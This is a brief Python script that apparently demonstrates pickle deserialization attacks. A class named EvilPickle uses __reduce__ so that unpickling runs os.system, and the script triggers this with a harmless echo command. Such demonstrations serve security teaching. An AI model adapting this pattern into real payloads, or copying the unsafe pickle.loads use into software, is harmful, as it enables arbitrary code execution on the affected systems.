import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized

if __name__ == '__main__':
    serialize_and_deserialize(EvilPickle())
